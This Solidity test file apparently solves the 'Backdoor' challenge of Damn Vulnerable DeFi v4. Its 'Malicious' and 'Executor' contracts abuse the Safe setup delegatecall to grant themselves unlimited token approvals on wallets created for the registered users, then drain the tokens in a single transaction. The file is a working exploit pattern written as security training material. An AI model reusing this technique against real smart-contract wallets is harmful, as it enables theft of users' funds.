// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Malicious {
    /// @notice This will be executed in context of the Safe
    function approveTokenAndSetFallbackManager(address _token, address _executor) external {
        IERC20(_token).approve(_executor, type(uint256).max);
        uint256 slot = uint256(keccak256("fallback_manager.handler.address"));
        address fallbackManager = address(0);
        assembly {
            sstore(slot, fallbackManager)
        }
    }
}

contract Executor {
    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;
    address[] users;
    address recovery;

    constructor(
        address _token,
        address payable _singletonCopy,
        address _walletFactory,
        address _walletRegistry,
        address[] memory _users,
        address _recovery
    ) {
        token = DamnValuableToken(_token);
        singletonCopy = Safe(_singletonCopy);
        walletFactory = SafeProxyFactory(_walletFactory);
        walletRegistry = WalletRegistry(_walletRegistry);
        users = _users;
        recovery = _recovery;
    }

    struct SafeCreationParams {
        address[] owners;
        uint256 threshold;
        address to;
        bytes data;
        address fallbackHandler;
        address paymentToken;
        uint256 payment;
        address payable paymentReceiver;
    }

    function execute() external {
        Malicious malicious = new Malicious();

        SafeCreationParams memory params = SafeCreationParams({
            owners: new address[](1),
            threshold: 1,
            to: address(malicious),
            data: abi.encodeCall(Malicious.approveTokenAndSetFallbackManager, (address(token), address(this))),
            fallbackHandler: address(walletRegistry),
            paymentToken: address(0),
            payment: 0,
            paymentReceiver: payable(0)
        });

        address[] memory wallets = new address[](users.length);

        for (uint256 i = 0; i < users.length; ++i) {
            params.owners[0] = users[i];

            bytes memory initializer = abi.encodeCall(
                Safe.setup,
                (
                    params.owners,
                    params.threshold,
                    params.to,
                    params.data,
                    params.fallbackHandler,
                    params.paymentToken,
                    params.payment,
                    params.paymentReceiver
                )
            );

            wallets[i] = address(
                walletFactory.createProxyWithCallback(
                    payable(singletonCopy),
                    initializer,
                    i,
                    walletRegistry
                )
            );
        }

        // rescue all tokens
        for (uint256 i = 0; i < users.length; ++i) {
            token.transferFrom(wallets[i], recovery, token.balanceOf(wallets[i]));
        }
    }
}

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(0x82b42900); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_backdoor() public checkSolvedByPlayer {
        Executor executor = new Executor(
            address(token),
            payable(singletonCopy),
            address(walletFactory),
            address(walletRegistry),
            users,
            recovery
        );
        executor.execute();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}
